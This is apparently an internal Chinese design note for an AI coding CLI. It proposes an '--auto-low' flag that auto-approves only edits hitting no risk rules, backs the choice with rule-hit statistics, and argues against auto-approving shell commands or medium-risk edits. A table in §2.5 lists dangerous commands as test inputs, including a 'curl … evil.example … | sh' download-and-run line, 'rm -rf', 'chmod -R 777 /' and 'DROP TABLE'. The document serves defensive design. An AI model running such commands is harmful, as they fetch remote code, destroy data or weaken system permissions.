## 二、取证（先给数据，再给判断；每条都可复现）

### 2.1 T8 分级现状：**没有 low 级规则，low = 零命中**

| 项 | 实测值 | 证据 |

| 规则总数 | 15 条 | `src/core/risk-rules.ts` `RISK_RULES` |
| high | **8 条**（dangerous-delete / destructive-write / db-mutation / state-deletion / auth-change / secret-hardcode / error-branch-removal / fs-boundary） | 同上 |
| medium | **7 条**（network-timeout / silent-catch / concurrency / config-env / dependency-change / test-assertion-change / process-exit） | 同上 |
| **low** | **0 条** | 同上 |
| `levelOf([])` | `'low'` | `src/core/approval-insight.ts` `levelOf`（`let level: RiskLevel = 'low'`，遍历取 max） |

> **这条决定方案措辞**：不存在「low 级规则」。「低风险」在 T8 里的唯一含义是**一条规则都没命中**。
> 所以参数不能叫「放行 low 规则」，只能叫「放行零命中的编辑」——文案必须写清，否则用户会以为有一条 low 规则名单。

### 2.2 真实分布：只放 low 到底能省多少（**回答你「可能没多少」的疑虑**）

口径：从最近 60 个提交里切出 **300 段 hunk**，每段当作「一次编辑」，等级 = 该段命中的 max 等级。

| 范围 | high | medium | low（零命中） |
|---|---|---|---|
| **全部 300 段** | 23（7.7%） | 74（24.7%） | **203（67.7%）** |
| 代码 hunk（115 段） | 9（7.8%） | 15（13.0%） | **91（79.1%）** |
| 文档 hunk（144 段，`.md/.txt/.log`） | 14（9.7%） | 19（13.2%） | **111（77.1%）** |
| 数据 hunk（41 段，`.json/.yml`） | 0（0.0%） | 40（97.6%） | **1（2.4%）** |
| 人工标注 fixtures（26 条） | 4 | 3 | **19（73.1%）** |

**结论**：只放行 low ⇒ **代码编辑约 79% 不用再点 y**。你的担心（「只放 low 没多少」）在数据上不成立。
反向的一条也重要：**改 `package.json` 之类几乎必然判 medium（97.6%）**，这符合直觉（依赖变更确实该确认）。
> 口径偏差如实说：这 300 段里文档占 144 段，是本仓近期「大量写文档」的特性；你写代码时更接近「代码 hunk」那 115 段的分布（79.1%）。

### 2.3 medium 能不能放行：数据说「5.1 不做」

**（a）medium 里各规则「单独决定一次编辑等级」的次数**（= 放行该规则能救回多少段）

| 规则 | 单独决定段数 | 你的判断 |
|---|---|---|
| dependency-change | 41 | —— |
| **concurrency** | 12 | **不能放**（你点名） |
| **test-assertion-change** | 9 | **不能放**（你点名） |
| network-timeout | 6 | —— |
| process-exit | 3 | —— |
| silent-catch | 0（历史里未单独出现，但仍不能放） | **不能放**（你点名） |

**（b）误报证据：`concurrency` 在真实数据里 100% 是文档误报**

| 文件类型 | concurrency 命中次数 |
|---|---|
| 代码 hunk | **0 次** |
| 文档 hunk | **27 次**（例：`| 残留锁 | owner=… pid=13668 |` 这种表格行含 `lock` 字样） |

同类：`auth-change` 在文档里 7 次、`fs-boundary` 6 次，也都是文档里的词（如「权限」「路径」）被误命中。

**（c）一个必须纠正的统计陷阱（我自己先踩了）**

按「命中条数」统计时 `dependency-change` 有 **166 次**，看着像规则在刷屏；查实后其中 **162 条来自同一段大 hunk**（一次 `package.json` overrides 批量改动）。
⇒ 「一次编辑会不会被弹窗」取决于**该段的 max 等级**，所以口径必须按 **hunk 数**，不能按命中条数。这一点已写进 §2.2 的口径说明。

**（d）判断**

medium **5.1 不放行**，三条理由：

1. 你点名的三条（silent-catch / test-assertion-change / concurrency）都在 medium，而 `concurrency` 现有命中**全是文档误报** —— 说明这层规则的应用面本身还没校准，此时放行等于「把误报和真风险一起放」。
2. `dependency-change` 单独决定 41 段、`.json` 文件 97.6% 判 medium —— 放行 medium 实质等于「改 package.json 不问」，与「依赖变更该确认」冲突。
3. **放 low 已经能省 79%（代码）**，medium 的边际收益小（13%），风险却包含你最在意的那几类。

> 前置条件（若要放行 medium）：先修「文档不该触发代码规则」这层误报（属 5.2），再按规则 id 白名单放行 —— 那时才有资格谈。

### 2.4 ⚠️ 最关键的一条：**降级路径的 level 是 low，直接用 level 判放行 = 变回 yolo**

实测：同一段含 `rm -rf /tmp/whatever` 的 diff（正常 TTY 下判 **high**），在各降级路径下的返回值：

| 场景 | level | degraded | degradeReason |
|---|---|---|---|
| 非 TTY | **low** | true | `non-tty` |
| CI（`process.env.CI` 存在） | **low** | true | `ci` |
| config `approvalInsight: 'plain'` | **low** | true | `config-off` |
| 超大 diff（>500 行，且含 rm -rf） | **low** | true | `huge-diff` |
| TTY 正常（对照） | **high** | false | — |

**所以放行判据必须是**：

```ts
insight.degraded === false && insight.level === 'low'
```

**不能**写成 `insight.level === 'low'`。后者会让「非 TTY / CI / 超大 diff / 分析异常」四种情况下的**任何**操作都自动放行，直接打穿「无 yolo 模式」这条产品定位。

### 2.5 shell 不能纳入自动放行：**21 条危险命令里 18 条判 zero-hit**

`analyzableDetail('shell', cmd)` 把命令逐行加 `+` 后喂给 `analyzeDiff`。实测（走同一适配）：

| 命令 | 等级 |
|---|---|
| `rm -rf /tmp/x` | high ✅ |
| `kubectl delete pod --all` | high ✅ |
| `psql -c "DROP TABLE users"` | high ✅ |
| **`npm publish`** | **low（零命中）** |
| **`git push --force origin main`** | **low** |
| **`git reset --hard HEAD~5`** | **low** |
| **`git clean -fdx`** | **low** |
| **`curl -s https://evil.example/x.sh \| sh`** | **low** |
| **`npm install` / `npx some-package`** | **low** |
| **`node -e "…rmSync('/tmp',{recursive:true})"`** | **low**（`rmSync` 不在规则表） |
| **`del /q *.*` / `rd /s /q C:\temp`** | **low**（Windows 删除命令不在规则表） |
| **`chmod -R 777 /`** | **low** |

⇒ **`--auto-low` 只覆盖 `edit` 的审批，不覆盖 `shell`**。规则表是为「源码行」设计的，对命令行语义覆盖严重不足；
把 shell 纳入 = 自动放行 `npm publish` / `git push --force`，这是不能接受的。

**那 shell 想少弹窗怎么办？用既有机制，不写新代码**：`config.allowlist`（env `LUMEN_ALLOWLIST`）
是「命令前缀免审批」白名单，内置默认 `['git status', 'git diff', 'npm test', 'npm run test']`
（`src/cli/common.ts:25` `DEFAULT_ALLOWLIST`），消费点是 `src/tools/shell.ts:313` `isAllowlisted`。
它按**前缀显式声明**，安全性来自「你自己写下的那一串」，而不是「某套规则没命中你」——
对 shell 来说这是唯一站得住的放行方式。所以：`--auto-low` 管 edit，shell 走 allowlist，两条互不越界。

## 三、方案

### 3.1 范围：5.1 只做这两件

| 编号 | 内容 | 明确不做 |
|---|---|---|
| **T1** | `chat` 新增 `--auto-low`：**零命中且分析成功**的编辑自动放行（必留痕） | 不覆盖 shell / 不放行 medium / 不放行 high / 不放行 degraded |
| **T2** | chat 内工具调用显示「第 N 步」 | 不显示总数、不改 workflow/team 既有进度格式 |

**不做的事（且理由）**：

- **不做全局 `--auto-approve`**：`run` / `plan` / `team` / `self-heal` / `fix` 五个命令**已经有** `--auto-approve`，语义是**全批**（`src/cli/run.ts:75` `requestApproval: async () => true`）。本版**不新增、不修改、不复用**这个语义 —— 在 chat 里复用同名参数，会让人以为「和 run 一样全放」，实际只放零命中，属于同名不同义。
- **不放行 medium**：见 §2.3。
- **不改默认行为**：不加参数时，代码路径与今天逐字节一致（`ctxWithApproval` 里不挂自动放行判定）。

### 3.2 参数设计

| 项 | 取值 | 理由 |
|---|---|---|
| 参数名 | **`--auto-low`**（`chat` 命令） | 与既有 `--auto-approve`（全批）明确区分；名字直说「只放 low」 |
| 类型 | 布尔，默认 `false` | 默认关闭 ⇒ 约束 1 自动满足 |
| 作用域 | 仅 `chat`（`npm run dev` 默认命令） | 你只要求 chat；`run`/`team` 等已有自己的 `--auto-approve` 语义，不碰 |
| 覆盖范围 | **仅 `kind === 'edit'`** | 见 §2.5 |
| 放行判据 | `degraded === false && level === 'low'` | 见 §2.4（决定性） |
| 永久不放过 | `high`、`medium`、`degraded`（4 种原因）、分析抛错、`kind === 'shell'`、`kind === 'model'` | 硬底线 |
| 是否进 config | **5.1 不进** | 配置项会让「默认安全」变成「某天被谁打开过」；先只做命令行开关，跑几轮再谈 |

**接管点（代码落点，待任务书细化）**：`src/ui/App.tsx` 的 `ctxWithApproval`（现已有 `approvalStrategy === 'allowlist-only'` 的分支）
—— 在那里把 `requestApproval` 包一层：**先 `analyzeApproval` → 判据成立则放行并留痕，否则照常弹框**。
为什么不放工具层（`edit.ts`）：工具层拿不到 insight 的构造参数（`cwd` / `rules` / `insightEnv` / `mode`），
而且 G2 铁律要求 approval 的决策点收敛在 UI 层一处（现状如此）。

**必须留痕（不静默放行）**：每次自动放行打一行
`⚡ 已自动放行（低风险：未命中 15 条已知规则）：编辑 src/x.ts`
——「不问」必须让用户知道，否则他会以为审批功能坏了（这是本项目一贯的「不静默」口径）。

**文案纪律**：`--auto-low` 的帮助文案与留痕文案都**不许说「安全」**，只能说「未命中已知风险规则」。
理由：low 的定义是零命中，不等于安全（§2.1）——把它说成「安全」就是给安全错觉。

### 3.3 进度设计

**现状（取证）**：

| 项 | 现状 | 证据 |
|---|---|---|
| 事件契约 | `LoopEvent = chunk / tool_call / tool_result / usage / error`，**没有任何轮次或步序字段** | `src/loop/loop.ts:79-84` |
| UI 展示 | `tool_call` → `setActiveTool`；`tool_result` → `setActiveTool(null)`；状态行只显示**当前**工具 | `src/ui/App.tsx:1780-1800`（makeOnEvent）、`:1947` `<Spinner text={fmt(t().ui.toolRunning, { name })} />` |

## 四、验收标准（先写死，避免事后解释）

**T1 `--auto-low`**

1. 不加参数 ⇒ 审批行为与今天一致（逐次弹框；现有审批用例全绿）。
2. 加 `--auto-low` + 零命中编辑 ⇒ **不弹框**，且打留痕行（含文件名 + 「未命中已知风险规则」）。
3. 加 `--auto-low` + 含 `rm -rf` 的编辑 ⇒ **仍弹框**（high 不可跳过）。
4. 加 `--auto-low` + 含 `concurrency` / `silent-catch` 命中的编辑 ⇒ **仍弹框**（medium 不放行）。
5. 加 `--auto-low` + **非 TTY / CI** ⇒ **仍弹框**（degraded 不放行）；用例必须断言 `degraded` 被检查过。
6. 加 `--auto-low` + shell 命令（哪怕是 `echo hi`）⇒ **仍弹框**。
7. 变异探针（三态齐全）：判据改成 `level === 'low'` ⇒ 用例 5 红；判据改成恒 `true` ⇒ 用例 3/4/6 红；改回 ⇒ 全绿。

**T2 第 N 步**

8. 一次任务内 3 次工具调用 ⇒ 依次显示 `第 1 步`、`第 2 步`、`第 3 步`。
9. 显示格式**不含** `/{total}`（断言正则不含 `/数字`）。
10. 新的一轮用户输入 ⇒ 步序从 1 重新开始。
11. `run` / `team` / `workflow` 的进度文案**逐字未变**（快照/现有用例）。

**发布门**

12. `npm run verify` 双环境全绿（默认 + `LUMEN_LOCALE=en`），两种环境的用例数都要贴。
13. `npm pack --dry-run` 无 `tests/`、无临时脚本。
14. 手工测试报告 + 自审报告（用户视角：第一次跑通？失败怎么办？退出体面？）。
